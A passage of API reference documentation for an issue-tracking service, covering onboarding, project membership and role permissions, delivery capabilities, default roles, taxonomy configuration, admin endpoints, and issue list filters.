**There is no self-removal here, and it is enforced rather than merely absent.** `DELETE …/members/{userId}` refuses with `422` when the target is the caller: leaving a workspace is a different feature — it needs a confirmation, somewhere to land afterwards, and an answer for "that was my only workspace" — and it is not built yet. A sole owner deleting themselves gets the `409` instead, because "promote another owner first" is the answer that will still be true once leaving exists. Self-*demotion* on `PATCH` is allowed: an owner stepping down to `ADMIN` while another owner exists is an ordinary handover.

## Onboarding

On first login (`needsOnboarding: true` from [`/auth/me`](#auth-endpoints)) a user either creates their own team or joins one they were invited to. These endpoints back the "join a team" screen — accepting an invite here needs no emailed token.

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/invites` | ✔ | Pending, non-expired invites addressed to your email |
| `POST` | `/invites/{id}/accept` | ✔ | Join the workspace; still email-bound (`404` if the invite isn't yours). Returns the workspace |
| `POST` | `/invites/{id}/decline` | ✔ | Remove the invite. `204` |
| `POST` | `/onboarding/create-team` | ✔ | The "Create a team" choice: provisions the demo starter workspace and completes onboarding. `204` |

Accepting an invite also re-checks the role the invite carries before writing it onto your new membership: an invite whose stored role is no longer a usable role of that workspace — a corrupt or hand-edited row, which a normal client never meets — is refused with the same `404` rather than creating a membership nobody could afterwards administer.

Completing onboarding clears `needsOnboarding` (afterwards `/auth/me` reports `false` and the welcome screen won't reappear). It happens by either **creating a team** (`POST /onboarding/create-team`, or the first `POST /workspaces`) or **accepting an invite**. The **demo workspace is provisioned only via `create-team`** — users who join an existing team get a clean account with just the team they joined.

## Projects

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `/workspaces/{wsId}/projects` | `project.create` | Create (`{"name", "key", "description?", "delivery?"}`); key is 1–10 chars `A-Z0-9`, unique per workspace. `201` |
| `GET` | `/workspaces/{wsId}/projects?includeArchived=false` | member | List projects |
| `GET` | `/workspaces/{wsId}/projects/{projectId}` | member | Get one |
| `PATCH` | `/workspaces/{wsId}/projects/{projectId}` | `project.edit` | Update `name` / `description` / `delivery` (and the deprecated `boardMode`) |
| `POST` | `/workspaces/{wsId}/projects/{projectId}/archive` | `project.archive` | Archive (read-only afterwards). `204` |
| `POST` | `/workspaces/{wsId}/projects/{projectId}/unarchive` | `project.archive` | Restore. `204` |
| `GET` | `/workspaces/{wsId}/projects/{projectId}/members` | member | List project members — **any workspace member**, no permission required |
| `POST` | `/workspaces/{wsId}/projects/{projectId}/members` | `project.member.manage` | Add a workspace member (`{"userId", "roleId"}`, or the deprecated `role` — [exactly one](#naming-a-role-roleid-and-the-deprecated-role-key); `422` for an unusable role). `201` |
| `PATCH` | `/workspaces/{wsId}/projects/{projectId}/members/{userId}` | `project.member.manage` | Change a member's project role (`{"roleId"}`). `409` if it would take the project's last administrator |
| `DELETE` | `/workspaces/{wsId}/projects/{projectId}/members/{userId}` | `project.member.manage` | Remove a member. `204`; `409` if they are the project's last administrator, or on lost lock contention (that one carries `Retry-After` — just retry) |
| `GET` | `/workspaces/{wsId}/projects/{projectId}/default-role` | `project.member.manage` | [This project's default access](#the-default-project-role): both links of the chain, the workspace's access mode, and which roles you may set it to |
| `PATCH` | `/workspaces/{wsId}/projects/{projectId}/default-role` | `project.member.manage` | Set it: exactly one of `{"roleId"}` or `{"inherit": true}`. Returns the project |

```json
// project shape
{
  "id": "…", "workspaceId": "…", "name": "Demo Project", "key": "DEMO",
  "description": "…", "archived": false,
  "boardMode": "KANBAN",                       // DEPRECATED mirror of delivery.board
  "delivery": {
    "board": "KANBAN",                         // KANBAN | SCRUM
    "releases": false,
    "estimation": false,
    "preset": "KANBAN"                         // DERIVED, read-only — never send it back
  },
  "defaultRole": {                             // READ-ONLY — the default-role chain
    "projectRoleId": null,                     // this project's own override
    "workspaceRoleId": null                    // the workspace-wide default behind it
  },
  "myRole": "MANAGER",                         // the caller's EXPLICIT project role KEY
  "myPermissions": ["issue.create", "issue.transition", "comment.edit:own", "…"],
  "createdAt": "…"
}
```

Every project response — create, list, get and update — carries [`myPermissions`](#permissions): the caller's effective **project-scoped** permissions in that project, including any they hold through their workspace role rather than a project membership. It is always present, and it can be **wider than `myRole` suggests** — `myRole` reports only the caller's explicit project membership row, and reads `VIEWER` when they have none. Gate on `myPermissions`; display `myRole`.

**Update permission.** `PATCH …/projects/{projectId}` needs [`project.edit`](#permissions) — held by a project `MANAGER` and, across every project of their workspace, by a workspace `OWNER`/`ADMIN` who need not be a project member; any other member gets a [`403` naming it](#what-a-403-says). That is the same permission every other project-content write asks for ([components](#components), [versions](#versions), [sprints](#sprints--backlog) have their own `*.manage` keys with the identical holders). Archiving (`project.archive`) and member management (`project.member.manage`) are **not** part of that set: `project.archive` remains the project `MANAGER`'s alone, and `project.member.manage` is held by the built-in `MANAGER` and `TEAM_LEAD`.

**Creating a project needs `project.create`.** Every built-in workspace role grants it, so every workspace member can still open a project exactly as before; it exists as its own key so that "only admins open new projects" becomes expressible. A caller without it gets a [`403` naming it](#what-a-403-says).

**Listing members needs nothing but membership.** `GET …/projects/{projectId}/members` is open to **any workspace member**, project member or not — the assignee picker, mention autocomplete and a People view all need it, and the workspace member list is already open the same way. Its old gate admitted everyone, so no caller's result changed.

**Adding a member.** Name the role with `roleId` — the id of any assignable project role, and the only way to name one of the workspace's [custom roles](#custom-roles) — or with the deprecated `role` **key** (`MANAGER`, `TEAM_LEAD`, `MEMBER`, `COMMENTER`, `VIEWER`). [Exactly one of the two](#naming-a-role-roleid-and-the-deprecated-role-key); neither and both are alike a `422`, as is a role reference this instance cannot assign in the **project** scope — including a *workspace* role such as `ADMIN`, because scope is part of the question and `MEMBER` names a different role in each scope. The grant ceiling applies here too: you cannot hand out a project role that grants a project permission you do not hold yourself, and it also bounds *removals* (the role a removed member falls back to must not exceed yours either).

**One escape from that ceiling, and only one.** Any holder of `project.member.manage` may always grant the built-in project `MANAGER` role — **to somebody else, never to themselves**. Without it a project whose only member-managers hold a narrower custom role could never acquire what none of them holds, and `project.archive` / `project.taxonomy.manage` have no other route in: a workspace `OWNER` who is not a member there holds no `project.member.manage` either, so they cannot assign any project role in that project. The self-exclusion is the load-bearing half — without it `project.member.manage` would silently imply all twenty project permissions for its own holder. The residual is documented rather than hidden: two cooperating members can bootstrap a project administrator between them (A grants B, then B grants A by the ordinary ceiling). That *is* the recovery procedure, it needs a willing accomplice who already has an account, and both steps are logged. A secondary effect is intended — after A promotes B, A can no longer demote or remove B, because the ceiling is also checked against a target's *current* role.

**Changing a member's role.** `PATCH …/projects/{projectId}/members/{userId}` takes `{"roleId": "…"}` and nothing else — there is no legacy `role` key here, because the endpoint is new and has no legacy client. It exists because the alternative was remove-then-add: two calls, each checked separately, with the member dropping onto the workspace default in between and a window in which the project genuinely had no administrator. The ceiling is checked on **both** the role they hold now and the one requested (checking only the new one would let a narrow member-manager demote somebody wider than themselves), the escape above applies, and re-sending the role they already hold is an accepted no-op. **The last-administrator guard applies to a demotion too** — it strands a project with no row removed at all — but is skipped for a *promotion*, since a role that itself grants `project.member.manage` cannot strand anything and requiring a second administrator before you may widen the only one would make the invariant unfixable. Self-demotion is allowed, and refused by that same guard exactly when it would orphan the project.

> **`VIEWER` is accepted but stored as `MEMBER`.** The built-in project role keyed `VIEWER` now grants **nothing**, whereas it historically meant "no explicit row", which granted everything. Writing it literally would silently mint someone who is refused every write, so this endpoint maps it to the contributor role (`MEMBER`) — and the response echoes what was **stored**, not what you sent. Read the `role` you get back rather than assuming it round-trips. A genuinely read-only membership is not expressible through this endpoint yet.

**Removing a member: the last administrator is protected.** `DELETE …/projects/{projectId}/members/{userId}` — and, since it strands a project just as effectively with no row removed at all, `PATCH …/projects/{projectId}/members/{userId}` — returns `409 "This is the project's last administrator — add another one first"` when the target is the only member of that project holding [`project.member.manage`](#permissions) — for the same reason the [workspace-level removal](#managing-members) refuses: nobody could manage the project's membership afterwards, and a workspace `OWNER`/`ADMIN` who is not a member of the project cannot step in, because that permission is not part of the workspace-wide curator set. Add another administrator first, then retry. The guard is about the **permission, not one particular role**: any role granting `project.member.manage` makes its holder an administrator here, and a role that does not grant it never does — so both built-in holders (`MANAGER` and `TEAM_LEAD`) are protected, and nothing else is. Unlike the workspace-level conflict this body carries no `projects` extension — the project is the one in the path. A project with no explicit administrator at all is a normal state and is left alone; only the step from one to none is refused.

This removal takes row locks on the project's administrators and bounds how long it waits for one, so it has the same second, non-invariant `409` as the workspace-level removal: [lock contention](#errors), carrying `Retry-After` and worth retrying **unchanged**. The last-administrator invariant carries no such header, because retrying it unchanged cannot help; neither variant carries an `errorType`.

Only **active** accounts count as an administrator here too, exactly as at the workspace level: a project whose sole administrator has been deactivated is treated as already having none, so this `409` never outlives the account it was about. What does **not** carry over is the archived-project exclusion. A workspace member removal skips archived projects so a frozen project can never block an offboarding; this endpoint keeps protecting them, because a project administrator holds `project.archive` and could otherwise archive their project and then remove themselves — leaving it frozen with nobody able to unarchive it, and no endpoint able to repair that. So on an archived project, `DELETE …/projects/{projectId}/members/{userId}` still refuses to take the last administrator while `DELETE …/workspaces/{workspaceId}/members/{userId}` ignores the project entirely.

**Archived projects are frozen.** `PATCH …/projects/{projectId}` on an archived project returns `409 "Project is archived"` — the same answer every issue edit, sprint mutation and rank move already gives. That covers `delivery` too, which changes how the board, the backlog, the rail and the issue detail render. Unarchive it first (`POST …/unarchive`, `project.archive`); reads keep working throughout. A caller who lacks the permission **and** hits an archived project gets the `403`, not this `409` — [permission first, project state second](#what-a-403-says).

### Delivery capabilities

A project declares **how its team delivers** through three independent capabilities. They ride the `delivery` object on **every** project response — list, get, create and update — so no surface needs an extra request (or a guess based on "does this project already have sprints?") to ask what kind of project this is. They are deliberately **not** part of [project configuration](#project-configuration): flipping a capability changes nothing about a project's workflow, priority set, type set or field set, and does not invalidate anything you cached from `…/config`.

| Capability | Values | Governs (in the UI) |
|---|---|---|
| `board` | `KANBAN` \| `SCRUM` | sprints as a planning concept: backlog sprint sections, sprint-scoped board, the sprint field on issues |
| `releases` | `true` / `false` | versions: the Releases page and rail item, fix/affects pickers and filters |
| `estimation` | `true` / `false` | story points: the points input and every point sum |

`delivery.preset` is a **derived** label the server computes from those three — a display convenience, never stored:

| `preset` | `board` | `releases` | `estimation` |
|---|---|---|---|
| `KANBAN` | `KANBAN` | off | off |
| `SCRUM` | `SCRUM` | off | on |
| `RELEASES` | `KANBAN` | on | off |
| `CUSTOM` | any other combination | | |

`CUSTOM` is a legal, first-class answer — "Scrum + Releases" is an ordinary way to work and is never forbidden.

> **Capabilities gate the UI, never the API.** This is a guarantee, not an implementation detail: **no endpoint, request field, filter or [HQL](#search-hql) field behaves differently because of a capability, and no status code anywhere depends on one.** A project with `releases: false` still accepts and returns version data; `POST …/sprints` still succeeds with `board: KANBAN`; issue creation with `storyPoints`, `fixVersionIds` and `sprintId` still returns `201` with **every** capability off. Turning a capability off never deletes, clears or moves anything — re-enabling it restores full function immediately. Do not treat a capability as a permission or as a schema switch.
>
> The single place a capability is visible in the API is **autocomplete metadata**: [`/search/schema`](#search-hql) omits `sprint` / `fixVersion` / `affectsVersion` / `storyPoints` when no visible project has the matching capability on, and the `SPRINT` / `VERSION` picklists (plus `/search/suggest` for the two version fields) only carry names from capability-on projects. That is a *suggestion* narrowing: every one of those fields still parses, compiles and runs, so no saved filter can break when a capability is flipped.

**Choosing them at creation.** `POST …/projects` takes an optional `delivery` object, and it is **partial per member**: whatever you leave out takes the lean default — `board: KANBAN`, `releases: false`, `estimation: false` — rather than staying unset. The three capabilities are independent and the server never infers one from another, so a client that means "Scrum, and we estimate" says both, in the one create call:

```bash
curl -X POST $BASE/workspaces/$WS/projects \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{
  "name": "Payments", "key": "PAY",
  "delivery": { "board": "SCRUM", "estimation": true }
}'
```

That project comes back with `board: "SCRUM"`, `estimation: true`, `releases: false` and the derived `preset: "SCRUM"`.

**Changing them later.** `PATCH …/projects/{projectId}` takes the same object, equally partial per member: `{"delivery": {"releases": true}}` turns releases on and leaves `board` and `estimation` untouched, and omitting `delivery` entirely leaves all three alone (renaming a project never quietly re-leans it). Setting a capability to the value it already has is a no-op that still returns `200` with the current state. The call needs `project.edit` (above) and returns `409` on an archived project; there is no confirmation step and no `409` for "you still have unreleased versions" — confirmations are a UI affordance. **Switching destroys nothing**: no issue's sprint is cleared, no version link removed, no story-point value erased, and re-enabling a capability restores full function immediately with no further action.

`board` is a closed set on both endpoints — an unknown value is a `400`, never a silent fall-through; `null`/omitted leaves the current value.

**`preset` cannot be sent.** It is derived, so a create or update body carrying `delivery.preset` is rejected — a named failure rather than a silent ignore. It fails at validation, so the body is the ordinary [field-anchored `400`](#conventions) keyed by JSON path:

```json
{ "type": "about:blank", "title": "Bad Request", "status": 400,
  "detail": "delivery.preset is derived from board/releases/estimation and cannot be set",
  "errors": { "delivery.preset": "delivery.preset is derived from board/releases/estimation and cannot be set" } }
```

The practical consequence: **you cannot blindly `PATCH` back the `delivery` object you read from a `GET`** — strip `preset` first and send only the capabilities you mean to change. The rejection is **total**: nothing else in the same body is applied on the way to it, so a body that sets `releases` *and* echoes `preset` changes nothing at all.

**`boardMode` is deprecated.** The top-level `boardMode` field is a mirror of `delivery.board`: it is still **populated** in every response and still **accepted** on `PATCH`, for one minor release, so clients written before `delivery` existed keep working. Sending both is fine when they **agree**; sending `boardMode` together with a **disagreeing** `delivery.board` is a `400` rather than a silent winner-takes-all — picking a winner would discard half of what an out-of-date client asked for without telling it which half. This one is enforced in the service, not by a field constraint, so it carries **no** `errors` map:

```json
{ "type": "about:blank", "title": "Bad Request", "status": 400,
  "detail": "boardMode and delivery.board disagree — send only one" }
```

This rejection is total too — the rest of the body is not applied. Create has no `boardMode` field at all, so the disagreement case is `PATCH`-only. When the mirror is eventually dropped, nothing about behavior changes: `delivery.board` already carries the identical value, so migrating off it is a rename. New clients should read and write `delivery` only.

**Defaults, and why an old project looks different.** A project created without a `delivery` object gets the lean defaults — `board: KANBAN`, `releases: false`, `estimation: false`. Projects that existed **before** delivery capabilities shipped were migrated to keep everything they already had: `releases: true`, `estimation: true`, and `board: SCRUM` if the project already owned a sprint. So an older project will legitimately look more capable than a freshly created one; that is the migration rule ("an upgrade never takes away a capability a project already had"), not a bug.

### The default project role

Every project response carries a `defaultRole` object — **read-only on the project endpoints** — naming the role a workspace member holds in this project when they have **no explicit project membership row**, which is most members.

```json
"defaultRole": {
  "projectRoleId": null,      // this project's own override
  "workspaceRoleId": null     // the workspace-wide default behind it
}
```

**Both links ship because a single value cannot say where it came from.** Default access resolves along a chain, first non-null winning:

> this project's `projectRoleId` → the workspace's `workspaceRoleId` → the built-in **Contributor**

| `projectRoleId` | `workspaceRoleId` | What a member with no row gets |
|---|---|---|
| set | anything | this project's own override |
| `null` | set | the workspace-wide default |
| `null` | `null` | the built-in **Contributor** |

A client given only the effective value could not tell "this project overrides the workspace" from "this project inherits" — which is exactly the sentence a default-access card has to write — so both links are published and the caller renders the chain. Resolve either id through [`GET /workspaces/{wsId}/roles`](#custom-roles); only ids travel here, never a name and never a permission list, so an id you cannot find in that catalog should render as a placeholder rather than a guess. For the **caller's own** effective rights there is nothing to compute: [`myPermissions`](#permissions) on the same response already accounts for whatever the chain gave them.

**Writing it: one endpoint per link, and neither is the project `PATCH`.** `PATCH …/projects/{projectId}` carrying `defaultRole`, or a flattened `defaultProjectRoleId`, is still **ignored** — it is not part of that body, the call succeeds as though you had not sent them, and nothing is stored (there is a test asserting exactly that). Each link is written through its own endpoint, under its own gate:

| Link | Endpoint | Permission |
|---|---|---|
| `projectRoleId` | `PATCH /workspaces/{wsId}/projects/{projectId}/default-role` | `project.member.manage` |
| `workspaceRoleId` | [`PATCH /workspaces/{wsId}`](#project-access) | `workspace.edit` |

The project-level write is deliberately **not** a field on the project `PATCH`: that endpoint is gated on `project.edit`, while a default role is membership authority and belongs to `project.member.manage`. Folding a second-permission field into a single-permission `PATCH` is how a gate gets forgotten.

`GET …/projects/{projectId}/default-role` is what a picker dialog opens against — the two ids again (a self-contained read is worth one repeated column), the workspace's `mode`, so the dialog can say *"this workspace is Restricted, so nothing is inherited right now — this default applies again if it is switched back to Open"* without a second fetch, and [`settable`](#settable--the-ceiling-rendered):

```json
{ "projectRoleId": null, "workspaceRoleId": null, "mode": "OPEN",
  "settable": { "canSet": [ … ], "cannotSet": [ { "roleId": "…", "name": "Project admin", "missing": "issue.delete" } ] } }
```

The `PATCH` takes **exactly one** of `{"roleId": "…"}` or `{"inherit": true}`; neither and both are alike a `422`. `inherit: true` stores `null`, meaning *"follow the workspace default"* — a real choice rather than an absence, since "deliberately follows the workspace" and "happens to name the same role the workspace does" diverge the moment the workspace default moves. Re-sending the value already stored is an accepted no-op, and the response is the full project, so a People card re-renders straight from the write.

**Both writes are [ceiling-bounded, and the two scopes bound differently](#the-default-role-pickers-are-ceiling-bounded--and-the-two-scopes-bound-differently)** — the project one against your own effective permissions *in that project*, with nobody exempt; the workspace one against a fixed built-in-Contributor baseline, with the workspace `OWNER` exempt. A role accepted at one scope may be refused at the other. A refusal is a `403` naming the permission, and both can also answer [`409 STRANDED_BY_INHERITANCE`](#stranded_by_inheritance--a-409-you-cannot-retry-your-way-out-of) when the new default would leave a project with administrators only by inheritance and nothing to inherit.

**Read-only here is not the same as immutable.** One endpoint does move these values: [`DELETE …/roles/{roleId}?reassignToRoleId=…`](#deleting-a-role-and-reassigning-its-holders) repoints every project — and the workspace — that used the deleted `PROJECT`-scoped role as its default onto the replacement, in the same transaction that moves the role's holders. That is deliberate: it is how a role deletion avoids leaving a dangling default. So a project's default access can change with nothing having touched the project — re-read `defaultRole` after a role deletion rather than treating it as frozen.

**The chain only yields while the workspace is `OPEN`.** [`projectAccessMode`](#project-access) rides every workspace response; in a `STRICT` workspace nothing is inherited at all, and a member with no explicit row holds only whatever their workspace role grants them everywhere. These ids stay stored and returned throughout — they are the **declared** default, inert rather than erased, and they go live again the moment the workspace is switched back. So read the mode before telling a user what the chain gives them, and note that a project whose own default is the built-in **Viewer** (which grants nothing) is effectively strict on its own even while the workspace is `OPEN`.

## Project configuration

The taxonomy (statuses, priorities, issue types, custom fields) lives in a catalog — **global** (maintained by the system administrator) and optionally **workspace-scoped** or **project-private** (see [Delegated administration](#delegated-administration)) — and reaches projects through reusable bindings: a *workflow* (statuses + allowed transitions), a *priority set* (offered priorities + the default for new issues), a *field set* (which custom fields the project's issues carry, their order and create-form behavior) and an *issue type set* (which types the project offers — restricting only issue creation and type changes; existing issues keep their type). Regular users read a project's **effective configuration** from one endpoint and never touch the catalog:

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/projects/{pId}/config` | member | Effective statuses (board order), transition rules, priorities (+default), issue types, custom fields |

```json
{
  "statuses":    [ { "id": "…", "name": "To Do", "color": "#6B7280", "category": "TODO", "position": 0 }, … ],
  "transitions": [ { "fromStatusId": null, "toStatusId": "…" } ],
  "priorities":  [ { "id": "…", "name": "High", "color": "#EA580C", "icon": "chevron-up", "isDefault": false }, … ],
  "issueTypes":  [ { "id": "…", "name": "Bug", "color": "#EF4444", "icon": "bug", "position": 0, "hierarchyLevel": 1 } ],
  "fields":      [ { "id": "…", "key": "severity", "name": "Severity", "type": "SELECT",
                     "config": { "options": [ { "id": "critical", "label": "Critical", "color": "#B91C1C" }, … ] },
                     "description": "Impact of the defect on users",
                     "required": false, "showOnCreate": true }, … ]
}
```

Transition semantics: a status with no source-specific rules is open (any move allowed); once it has rules, only its listed targets plus wildcard (`fromStatusId: null` = "from any") targets are accepted — a forbidden move returns `422` on issue updates and board drag-and-drop.

Custom field types and their JSON value shapes: `TEXT`/`TEXTAREA`/`URL` — string; `NUMBER` — number (`config.min`/`max` enforced); `DATE` — `"YYYY-MM-DD"` string; `SELECT` — option id string; `MULTI_SELECT` — array of option ids; `USER` — user UUID (must be a workspace member); `CHECKBOX` — boolean. A `required` field must be filled on create and can never be cleared; `showOnCreate: false` fields are only offered when editing.

Each issue type carries a `hierarchyLevel`: a parent must be **exactly one level above** its child (adjacent tiers only). The seeded taxonomy is `Epic` = 2, `Story`/`Task`/`Bug` = 1 and `Sub-task` = 0 — so an Epic can parent a Story/Task/Bug (but **not** a Sub-task directly), a Story/Task/Bug can parent a Sub-task, and a Sub-task can parent nothing. Use these levels to filter parent pickers and offer "create sub-task" (see [Issues](#issues)).

## System administration

Endpoints under `/admin/**` require the **system `ADMIN` role** (instance-wide, independent of workspace/project roles; regular users get `403`). They manage the global catalog and the project bindings:

| Method | Path | Description |
|---|---|---|
| `GET/POST` | `/admin/statuses` · `/admin/priorities` · `/admin/issue-types` | List catalog (with usage counts) / create. `201`. Create/rename returns `409` when the name collides with any item **visible** to the scope — including one inherited from a wider scope (reuse it instead of duplicating) |
| `PATCH` | `/admin/{catalog}/{id}` | Update |
| `POST` | `/admin/{catalog}/{id}/archive` · `/unarchive` | Hide from new use / restore |
| `DELETE` | `/admin/{catalog}/{id}?replaceWithId=` | Delete; `409` while issues reference it and no replacement is given — with `replaceWithId`, affected issues are remapped |
| `GET` | `/admin/{catalog}/{id}/usage` | Usage detail (all four catalogs incl. `fields`): names of containing workflows/sets and the projects reached through them, plus the referencing-issue count |
| `GET/POST` | `/admin/workflows` | List / create (`{"name", "description?", "statusIds": […], "transitions": […]}`) |
| `PATCH/DELETE` | `/admin/workflows/{id}` | Full replacement / delete (`409` while projects use it; the system default is not deletable) |
| `GET/POST` | `/admin/priority-sets` | List / create (`{"name", "items": [{"priorityId", "isDefault"}]}`) |
| `PATCH/DELETE` | `/admin/priority-sets/{id}` | Full replacement / delete (`409` while in use) |
| `GET/POST` | `/admin/fields` | List custom fields (with usage counts) / create (`{"name", "key?", "type", "config?", "description?"}`; blank `key` is derived from the name — key and type are immutable afterwards). Create/rename returns `409` when the name **or** key collides with any field visible to the scope, inherited ones included (reuse it instead of duplicating) |
| `PATCH` | `/admin/fields/{id}` | Update name/config/description (also `POST /{id}/archive` · `/unarchive`) |
| `DELETE` | `/admin/fields/{id}?dropValues=` | Delete; `409` while issues hold values unless `dropValues=true` (drops them — there is no remap across value shapes; archive instead to keep them). Also `409` for a built-in system field (`isSystem: true` in the list response) — those can only be archived, not deleted |
| `GET/POST` | `/admin/field-sets` | List / create (`{"name", "items": [{"fieldId", "required", "showOnCreate"}]}` — a required field is always shown on create) |
| `PATCH/DELETE` | `/admin/field-sets/{id}` | Full replacement / delete (`409` while in use; the system default "No fields" set is not deletable) |
| `GET/POST` | `/admin/issue-type-sets` | List / create (`{"name", "typeIds": […]}` in display order; a set can never be empty) |
| `PATCH/DELETE` | `/admin/issue-type-sets/{id}` | Full replacement / delete (`409` while in use; the system default "All types" set is not deletable) |
| `GET` | `/admin/projects` | Assignment matrix: every project × its bindings |
| `PATCH` | `/admin/projects/{id}/bindings` | `{"workflowId", "prioritySetId", "fieldSetId", "issueTypeSetId"}` (null = system default); `409` when issues sit in statuses the new workflow lacks |
| `GET/POST` | `/admin/users` | List accounts (paginated `?page=&size=`, oldest first) / create (`{"email", "displayName", "systemRole?"}`). No password or email — the `201` response is `{"user", "setupLink"}`; hand the one-time `setupLink` (`/reset-password?token=`, valid 7 days) to the person |
| `POST` | `/admin/users/{id}/setup-link` | Regenerate the one-time setup link → `{"setupLink"}` |
| `PATCH` | `/admin/users/{id}` | Change `systemRole` (`ADMIN`/`USER`) and/or `status` (`ACTIVE`/`DISABLED`); `409` when it would disable/demote the last active admin or your own account (disabling revokes the user's refresh tokens) |

Integrity rules: deletions never leave dangling references (remap or `409`), no workflow can end up empty, every priority set keeps a default, and a workflow change is refused while it would strand issues in statuses invisible to the board.

## Delegated administration

The same catalog and binding operations are available at two **delegated** scopes so teams self-serve without a system admin. Authorization is membership-based (not the system `ADMIN` role) and is a permission check like everywhere else:

- **Workspace settings** — `/api/workspaces/{wsId}/admin/**`, requires [`workspace.taxonomy.manage`](#permissions) (workspace `OWNER`/`ADMIN`).
- **Project settings** — `/api/workspaces/{wsId}/projects/{projectId}/admin/**`, requires [`project.taxonomy.manage`](#permissions) (project `MANAGER` only — it is **not** part of what a workspace `OWNER`/`ADMIN` gets across their workspace, so an owner with no project membership row is refused here).

Each scope owns its own rows: a workspace admin creates **workspace-scoped** statuses/priorities/types/fields and reusable sets; a project admin creates **project-private** ones. Tenancy: a non-member of the workspace, and an unknown workspace or project, all get `404`; a member without the permission gets a `403` that [names it](#what-a-403-says).

> **`/projects/{pId}/admin/**` now answers `403` where it used to answer `404`.** A workspace member who is not a member of the project used to get `404` from this family while its sibling `/workspaces/{wsId}/admin/**` answered `403` for the identical failure — one shape of failure, two answers. It is `403` everywhere now. This is safe only because the project is **already listed to that caller** by `GET …/projects`, so nothing is disclosed that they could not already see. **The tenancy rule is unchanged and absolute:** somebody who is not a member of the *workspace*, or a workspace that does not exist, still gets `404` — the flip applies only after workspace membership has been proved. If you were treating a `404` here as "no such project", treat it as "not your workspace" instead.

**Scoping & visibility**

- List endpoints return everything **visible** to the scope: global ∪ workspace ∪ (for a project) its own private rows. Every row carries a `scope` field (`GLOBAL` / `WORKSPACE` / `PROJECT`); only own-scope rows are editable — a write to an inherited (higher-scope) row returns `404`.
- **Reuse over duplication** — creating or renaming a status / priority / issue type / field (fields also on `key`) is refused with `409` when the name collides with any item **visible** to the scope, whether it's an own-scope row or one inherited from a wider scope (a system/global item, or a workspace item inherited by a project). Bind the inherited item instead of minting a scoped duplicate.
- A set (workflow / priority set / field set / type set) may reference only catalog rows visible to its scope; a foreign or wrong-scope reference is rejected `422`.
- A project (or the workspace matrix) may bind only a set visible to the target project — global, its workspace's, or its own — else `422`.

**Catalog & sets** — identical shapes and integrity rules to [System administration](#system-administration); `{base}` is the scope prefix above:

| Method | Path | Description |
|---|---|---|
| `GET` `POST` | `{base}/statuses` · `/priorities` · `/issue-types` · `/fields` | List (visible, scope-tagged) / create at this scope |
| `PATCH` | `{base}/{catalog}/{id}` | Update an own-scope row |
| `POST` | `{base}/{catalog}/{id}/archive` · `/unarchive` | Archive / restore an own-scope row |
| `DELETE` | `{base}/{catalog}/{id}?replaceWithId=` (fields: `?dropValues=`) | Delete an own-scope row |
| `GET` | `{base}/{catalog}/{id}/usage` | Usage detail |
| `GET` `POST` `PATCH` `DELETE` | `{base}/workflows` · `/priority-sets` · `/field-sets` · `/issue-type-sets` [`/{id}`] | Reusable sets at this scope |

**Bindings**

| Method | Path | Permission | Description |
|---|---|---|---|
| `GET` `PATCH` | `/api/workspaces/{wsId}/projects/{pId}/admin/bindings` | `project.taxonomy.manage` | Read / set this project's four bindings (`{"workflowId","prioritySetId","fieldSetId","issueTypeSetId"}`, null = system default) |
| `GET` | `/api/workspaces/{wsId}/projects/{pId}/admin/binding-options` | `project.taxonomy.manage` | Sets bindable to this project, per dimension — each `{id, name, scope}` |
| `GET` | `/api/workspaces/{wsId}/admin/projects` | `workspace.taxonomy.manage` | Binding matrix for every project in the workspace |
| `PATCH` | `/api/workspaces/{wsId}/admin/projects/{pId}/bindings` | `workspace.taxonomy.manage` | Set a project's bindings |
| `GET` | `/api/workspaces/{wsId}/admin/binding-options` | `workspace.taxonomy.manage` | Sets bindable within the workspace (global ∪ workspace) |

## Issues

Issues live under a project and are addressed by **number** — the numeric part of their key (`DEMO-42` → `…/issues/42`). Numbers are sequential per project and never reused.

**The project's [delivery capabilities](#delivery-capabilities) change nothing here.** `storyPoints`, `sprintId`, `fixVersionIds` and `affectsVersionIds` are accepted, stored and returned identically whatever a project declares — a project with `estimation: false` still takes a point value, and one with `board: KANBAN` still takes a `sprintId`. Every field below is always present in the response too; a capability hides a control in the UI and never removes anything from the API.

**Hierarchy.** An issue may have a parent in the same project, governed by issue-type [hierarchy levels](#project-configuration) (a parent's type level must be strictly greater than the child's). Every `IssueResponse` carries the parent summary (`parentId`, `parentKey`, `parentTitle`, `parentTypeId`, all `null` when there is no parent) and a direct-children roll-up (`childCount`, and `doneChildCount` for children in a DONE-category status). `GET …/issues/{number}/children` lists the direct children in board order.

**Listing — dual shape.** Without `size`, `GET …/issues` returns a `BoardIssuesResponse` object (the board/kanban path): `{ "issues": IssueResponse[], "truncated": boolean, "totalAvailable": integer, "cap": integer }`. `issues` is bounded server-side to `cap` (default 500, never client-overridable); when the project after the same filters exceeds it, `truncated` is `true` and `totalAvailable` reports the full count so the UI can show "Showing first {cap} of {totalAvailable}". Pass `size` to switch to a paginated [envelope](#conventions) (the backlog path); the optional `excludeDone=true` then drops issues in a DONE-category status server-side. The `statusId` / `assigneeId` / `priorityId` / `componentId` / `labelId` / `fixVersionId` / `sprintId` / `noSprint` filters apply in both modes and are ANDed together. Rows come back in the shared backlog/board **rank** order (`position`, then newest first) — the rank value itself is never exposed.

**Filtering by label.** The [label](#labels) filter is applied **server-side** in both modes (it has to search the whole project, not just the capped page already on screen): repeat `labelId` once per label and choose how they combine with `labelMatch` — `any` (default, carries at least one) or `all` (carries every one), lowercase. Any other `labelMatch` value is a `400`, as is passing more than 20 distinct `labelId` values (the per-issue label limit).

**Filtering by component.** Same rule, simpler shape: `componentId` is a single optional uuid, applied **server-side** and ANDed with everything above. A [component](#components) id belonging to another project simply matches nothing — it is never an error.

**Filtering by fix version.** Likewise: `fixVersionId` is a single optional uuid, applied **server-side** and ANDed with everything above. It matches the **fix** role only — an *affects* link to the same [version](#versions) does not match a "fix version" filter. An id from another project simply matches nothing.

**Filtering by sprint.** `sprintId` narrows the list to one [sprint](#sprints--backlog); `noSprint=true` narrows it to the backlog (issues in no sprint at all). Both are applied **server-side** and ANDed with everything above, and a sprint id from another project simply matches nothing. The two are **mutually exclusive** — "in this sprint" and "in no sprint" can never both hold, so sending both is a `400` rather than a silently empty result you would misread as "nothing matches".

```bash
